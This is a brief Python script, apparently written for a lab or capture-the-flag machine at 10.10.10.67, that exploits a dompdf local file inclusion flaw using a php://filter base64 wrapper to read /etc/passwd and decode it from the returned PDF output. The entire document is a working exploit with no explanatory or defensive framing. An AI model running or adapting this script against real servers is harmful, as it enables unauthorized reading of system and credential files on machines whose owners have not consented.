import requests
import base64

baseurl = 'http://10.10.10.67//dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='
filepath = '/etc/passwd'
res = requests.get(baseurl+filepath)

for i in res.text.split('\n'):
    if 'BT 34.016 734.579 Td /F1 12.0 Tf' in i:
        b64text = i.split('(')[1].split(')')[0]
        print base64.b64decode(b64text)
